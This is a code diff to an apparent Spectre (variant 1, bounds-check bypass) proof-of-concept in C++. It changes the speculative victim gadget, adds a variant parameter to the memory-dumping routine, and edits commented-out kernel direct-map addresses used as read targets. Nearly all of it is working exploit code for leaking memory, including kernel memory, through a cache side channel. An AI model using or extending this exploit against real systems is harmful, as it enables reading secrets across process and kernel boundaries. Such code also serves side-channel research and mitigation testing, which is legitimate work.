@@ -200,7 +200,8 @@ public:
 
   void victim_variant1(size_t index) {
     if (index < data_array.data_size) {
-      volatile uint8_t tmp = cache_probe[(data_array.data[index] & mask) * CACHE_LINE_SIZE];
+      uint8_t value = data_array.data[index];
+      volatile uint8_t tmp = cache_probe[(value & mask) * CACHE_LINE_SIZE];
     }
   }
 
@@ -419,11 +420,11 @@ public:
   }
 
 
-  void dump(const uint8_t* target_ptr, size_t target_len) {
+  void dump(const uint8_t* target_ptr, size_t target_len, SpectreVariant variant) {
     for (const uint8_t* ptr = target_ptr; ptr < target_ptr + target_len; ptr++) {
       uint8_t value[2];
       int score[2];
-      readMemoryByte(ptr, SpectreVariant::FunctionsBoundsCheckBypassKernel, value, score);
+      readMemoryByte(ptr, variant, value, score);
 
       LOG(
         "Reading at %p... %s: 0x%02X='%c', score=%d",
@@ -511,9 +512,7 @@ int main(int argc, const char** argv) {
   int target_len = strlen(target_ptr);
 
   LOG("physical address: %p / %p\n", target_ptr, libflush.to_physical(target_ptr));
-//   target_ptr = 0xffff880000000000 + (const char*)libflush.to_physical(target_ptr);
-//   target_ptr = 0xffff880000000000 + (const char*)0x2cfa3a2c8;
-//   target_ptr = (char*)0xffffffffc0024b90;
+  //target_ptr = 0xffff880000000000 + (const char*)0x3bdbdd348;
 
   if (argc == 3) {
     sscanf(argv[1], "%p", &target_ptr);
@@ -525,7 +524,7 @@ int main(int argc, const char** argv) {
     return -1;
   }
 
-  spectre.dump((uint8_t*)target_ptr, target_len);
+  spectre.dump((uint8_t*)target_ptr, target_len, SpectreVariant::FunctionsBoundsCheckBypass);
   return (0);
 }
 #endif
